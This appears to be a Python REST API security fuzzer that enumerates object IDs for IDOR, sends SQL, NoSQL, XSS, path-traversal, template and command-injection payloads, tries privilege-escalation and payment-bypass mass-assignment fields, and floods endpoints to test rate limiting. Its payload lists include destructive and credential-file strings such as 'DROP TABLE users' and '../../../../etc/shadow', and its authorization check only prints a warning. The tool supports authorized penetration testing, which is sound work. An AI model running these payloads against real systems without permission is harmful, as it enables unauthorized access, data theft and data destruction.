#!/usr/bin/env python3
"""
api_fuzzer.py - REST API security fuzzer with IDOR, injection, and auth testing.

Usage:
    python scripts/api_fuzzer.py --url https://api.example.com/users/{id} --fuzz-id --range 1-1000
    python scripts/api_fuzzer.py --openapi swagger.json --auth "Bearer TOKEN" --tests all
    python scripts/api_fuzzer.py --url https://api.example.com/login --method POST --fuzz-auth
    python scripts/api_fuzzer.py --url https://api.example.com/items/{id} --fuzz-id --auth "Bearer TOKEN"

Engagement proof: ENGAGEMENT_PROOF env var required.
"""
import argparse
import json
import os
import random
import re
import sys
import time
import urllib.request as ureq
import urllib.parse as uparse
import urllib.error
import concurrent.futures

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")

# Injection payloads
INJECTION_PAYLOADS = {
    "sqli": ["'", "''", "' OR '1'='1", "1' OR 1=1--", "' UNION SELECT 1--",
             "'; DROP TABLE users--", "1; SELECT SLEEP(3)--", "' OR 1=1#"],
    "nosqli": ['{"$gt": ""}', '{"$ne": null}', '{"$where": "this.x==this.x"}',
               '{"$regex": ".*"}', '{"$exists": true}'],
    "xss": ['<script>alert(1)</script>', '"><script>alert(1)</script>',
            "javascript:alert(1)", '<img src=x onerror=alert(1)>'],
    "lfi": ["../../etc/passwd", "../../../../etc/shadow", "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../etc/passwd%00", "....//....//etc/passwd"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>", "{{config}}"],
    "cmd": [";id", "&&id", "|id", ";sleep 3", "`id`", "$(id)"],
}

# Mass assignment fields
MASS_ASSIGN_FIELDS = {
    "privilege_escalation": {"isAdmin": True, "role": "admin", "is_admin": 1,
                              "admin": True, "superuser": True, "verified": True,
                              "email_verified": True, "premium": True, "accountType": "admin"},
    "bypass_payment": {"paid": True, "subscription": "premium", "credits": 99999,
                       "discount": 100, "price": 0, "amount": -1},
    "data_exposure": {"debug": True, "verbose": True, "include_deleted": True,
                      "show_all": True, "internal": True},
}


def make_request(url: str, method: str = "GET", headers: dict = None,
                 body=None, timeout: int = 15) -> dict:
    h = {"User-Agent": "Mozilla/5.0 (compatible; APIFuzzer/1.0)",
         "Accept": "application/json, */*"}
    if headers: h.update(headers)
    if isinstance(body, dict):
        body = json.dumps(body).encode()
        h["Content-Type"] = "application/json"
    elif isinstance(body, str):
        body = body.encode()

    req = ureq.Request(url, data=body if method != "GET" else None, headers=h, method=method)
    start = time.time()
    try:
        resp = ureq.urlopen(req, timeout=timeout)
        elapsed = round((time.time() - start) * 1000)
        content = resp.read()
        return {"status": resp.status, "elapsed_ms": elapsed,
                "body": content.decode("utf-8", errors="replace")[:500],
                "headers": dict(resp.headers), "size": len(content)}
    except urllib.error.HTTPError as e:
        elapsed = round((time.time() - start) * 1000)
        body_err = e.read().decode("utf-8", errors="replace")[:200] if e.fp else ""
        return {"status": e.code, "elapsed_ms": elapsed, "body": body_err, "headers": {}}
    except Exception as e:
        return {"status": 0, "elapsed_ms": 0, "body": str(e)[:100], "headers": {}}


def fuzz_idor(url_template: str, id_range: tuple, method: str = "GET",
              auth_headers: dict = None, threads: int = 20) -> list:
    """Test IDOR by enumerating IDs."""
    findings = []
    start_id, end_id = id_range
    ids = list(range(start_id, min(end_id + 1, start_id + 1000)))  # Cap at 1000
    print(f"[*] IDOR test: {len(ids)} IDs | {url_template}")

    baseline = make_request(url_template.replace("{id}", "99999999"), method, auth_headers)
    baseline_status = baseline["status"]
    print(f"  Baseline (non-existent): {baseline_status}")

    def check_id(id_val: int):
        url = url_template.replace("{id}", str(id_val))
        r = make_request(url, method, auth_headers)
        if r["status"] not in (404, baseline_status, 0):
            with __import__("threading").Lock():
                findings.append({"id": id_val, "status": r["status"],
                                  "size": r["size"], "url": url,
                                  "body_preview": r["body"][:100]})
                if len(findings) <= 5:
                    print(f"  [!] IDOR candidate: id={id_val} -> {r['status']} ({r['size']} bytes)")
        return r["status"]

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        results = list(ex.map(check_id, ids))

    unique_statuses = set(results)
    print(f"\n[*] IDOR results: {len(findings)} candidates | Status codes: {unique_statuses}")
    return findings


def fuzz_injection(url: str, params: dict, method: str = "GET",
                   auth_headers: dict = None, types: list = None) -> list:
    """Test for injection vulnerabilities."""
    findings = []
    types = types or ["sqli","xss","ssti"]

    for param_name in params:
        for inj_type in types:
            payloads = INJECTION_PAYLOADS.get(inj_type, [])
            print(f"[*] {inj_type} fuzzing: param={param_name} ({len(payloads)} payloads)")
            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = payload

                if method == "GET":
                    test_url = f"{url}?{uparse.urlencode(test_params)}"
                    r = make_request(test_url, "GET", auth_headers)
                else:
                    r = make_request(url, method, auth_headers, test_params)

                # Check for injection indicators
                indicators = {
                    "sqli": ["SQL syntax", "mysql_fetch", "ORA-", "SQLSTATE", "sqlite3", "PostgreSQL"],
                    "xss": ["<script>alert", "onerror=alert"],
                    "ssti": ["49", "Error", "{{", "TemplateNotFound"],
                    "lfi": ["root:x:", "bin:x:", "[fonts]", "[boot loader]"],
                    "cmd": ["uid=", "root", "www-data"],
                }
                for indicator in indicators.get(inj_type, []):
                    if indicator.lower() in r["body"].lower():
                        finding = {"type": inj_type, "param": param_name, "payload": payload,
                                    "status": r["status"], "indicator": indicator,
                                    "response": r["body"][:200]}
                        findings.append(finding)
                        print(f"  [!] POTENTIAL {inj_type.upper()}: {param_name}={payload[:30]} -> '{indicator}'")
                        break
                time.sleep(0.1)

    return findings


def fuzz_mass_assignment(url: str, base_body: dict, method: str = "POST",
                          auth_headers: dict = None) -> list:
    """Test for mass assignment vulnerabilities."""
    findings = []
    print(f"[*] Mass assignment test: {len(sum([list(v.keys()) for v in MASS_ASSIGN_FIELDS.values()], []))} fields")
    baseline = make_request(url, method, auth_headers, base_body)
    print(f"  Baseline: {baseline['status']} ({baseline['size']} bytes)")

    for category, fields in MASS_ASSIGN_FIELDS.items():
        test_body = {**base_body, **fields}
        r = make_request(url, method, auth_headers, test_body)
        if r["status"] == baseline["status"] and r["size"] != baseline["size"]:
            findings.append({"category": category, "status": r["status"],
                              "size_diff": r["size"] - baseline["size"],
                              "added_fields": list(fields.keys()),
                              "response": r["body"][:200]})
            print(f"  [!] Mass assignment candidate ({category}): size changed by {r['size']-baseline['size']} bytes")
        elif r["status"] not in (400, 422, 403):
            print(f"  [?] {category}: {r['status']} (may be accepted)")

    return findings


def rate_limit_test(url: str, method: str = "GET", auth_headers: dict = None,
                     count: int = 100, interval: float = 0.01) -> dict:
    """Test rate limiting."""
    print(f"[*] Rate limit test: {count} requests at {1/interval:.0f} req/s")
    statuses = []
    for i in range(count):
        r = make_request(url, method, auth_headers)
        statuses.append(r["status"])
        if r["status"] == 429:
            print(f"  Rate limited at request {i+1}: 429")
            return {"rate_limited": True, "limit_at": i+1, "statuses": statuses[:20]}
        time.sleep(interval)
    unique = set(statuses)
    is_limited = 429 in unique
    print(f"  Rate limit: {'YES (429 seen)' if is_limited else 'NO - no rate limiting detected'}")
    return {"rate_limited": is_limited, "total_requests": count, "statuses": dict(
        {str(s): statuses.count(s) for s in unique})}


def parse_openapi(spec_path: str) -> list:
    """Parse OpenAPI/Swagger spec into testable endpoints."""
    with open(spec_path) as f:
        spec = json.load(f)

    base_url = ""
    if "servers" in spec:
        base_url = spec["servers"][0].get("url", "")
    elif "host" in spec:
        scheme = spec.get("schemes", ["https"])[0]
        base_url = f"{scheme}://{spec['host']}{spec.get('basePath','')}"

    endpoints = []
    paths = spec.get("paths", {})
    for path, methods in paths.items():
        for method, details in methods.items():
            if method.upper() in ["GET","POST","PUT","PATCH","DELETE"]:
                params = {}
                for param in details.get("parameters", []):
                    if param.get("in") in ("query","path"):
                        params[param["name"]] = param.get("example", "test")
                endpoints.append({
                    "url": base_url + path, "method": method.upper(),
                    "params": params, "has_id": "{" in path,
                    "summary": details.get("summary",""),
                })
    print(f"[*] Parsed {len(endpoints)} endpoints from {spec_path}")
    return endpoints


def main():
    if not ENGAGEMENT_PROOF:
        print("[!] WARNING: Set ENGAGEMENT_PROOF. Authorized testing only.")

    p = argparse.ArgumentParser(description="API security fuzzer (authorized testing only)")
    p.add_argument("--url", help="Target URL (use {id} for IDOR)")
    p.add_argument("--method", default="GET")
    p.add_argument("--auth", help="Auth header value: 'Bearer TOKEN'")
    p.add_argument("--openapi", help="OpenAPI/Swagger spec JSON")
    p.add_argument("--tests", help="Tests to run: idor,injection,mass-assignment,rate-limit,all", default="all")
    p.add_argument("--fuzz-id", action="store_true")
    p.add_argument("--range", default="1-100", help="ID range: start-end")
    p.add_argument("--params", help="URL params JSON: {\"name\":\"value\"}")
    p.add_argument("--body", help="Request body JSON string")
    p.add_argument("--threads", type=int, default=20)
    p.add_argument("--output", help="Results JSON")
    args = p.parse_args()

    auth_headers = {}
    if args.auth:
        auth_headers["Authorization"] = args.auth

    tests = [t.strip() for t in args.tests.split(",")] if args.tests != "all" else ["idor","injection","mass-assignment","rate-limit"]
    params = json.loads(args.params) if args.params else {}
    body = json.loads(args.body) if args.body else {}
    findings = []

    if args.openapi:
        endpoints = parse_openapi(args.openapi)
        print(f"[*] Testing {len(endpoints)} API endpoints...")
        for ep in endpoints[:20]:  # Limit to 20 for safety
            print(f"\n  [{ep['method']}] {ep['url']}")
            if "injection" in tests and ep.get("params"):
                f = fuzz_injection(ep["url"], ep["params"], ep["method"], auth_headers)
                findings.extend(f)
    elif args.url:
        if (args.fuzz_id or "idor" in tests) and "{id}" in args.url:
            start_id, end_id = (int(x) for x in args.range.split("-"))
            f = fuzz_idor(args.url, (start_id, end_id), args.method, auth_headers, args.threads)
            findings.extend(f)
        if "injection" in tests and params:
            f = fuzz_injection(args.url, params, args.method, auth_headers)
            findings.extend(f)
        if "mass-assignment" in tests and body:
            f = fuzz_mass_assignment(args.url, body, args.method, auth_headers)
            findings.extend(f)
        if "rate-limit" in tests:
            rl = rate_limit_test(args.url, args.method, auth_headers)
            findings.append({"type": "rate_limit", **rl})

    print(f"\n[*] Total findings: {len(findings)}")
    if args.output:
        with open(args.output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[+] Saved: {args.output}")


if __name__ == "__main__":
    main()
